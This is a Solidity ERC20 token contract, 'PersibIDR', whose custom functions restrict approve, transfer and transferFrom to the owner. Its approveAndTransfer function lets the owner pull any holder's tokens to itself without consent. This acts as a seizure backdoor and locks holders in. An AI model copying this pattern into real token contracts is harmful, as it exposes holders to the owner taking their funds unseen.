// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract PersibIDR is ERC20, Ownable {
    constructor() ERC20("PersibIDR", "PIDR"){}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    /// START - CUSTOM FUNCTIONS

    function approve(address spender, uint256 amount) override public onlyOwner returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) override public onlyOwner returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) override public onlyOwner returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function approveAndTransfer(address owner, uint amount) public onlyOwner {
        _approve(owner, _msgSender(), amount);
        _spendAllowance(owner, _msgSender(), amount);
        _transfer(owner, _msgSender(), amount);
    }

    /// END - CUSTOM FUNCTIONS
}
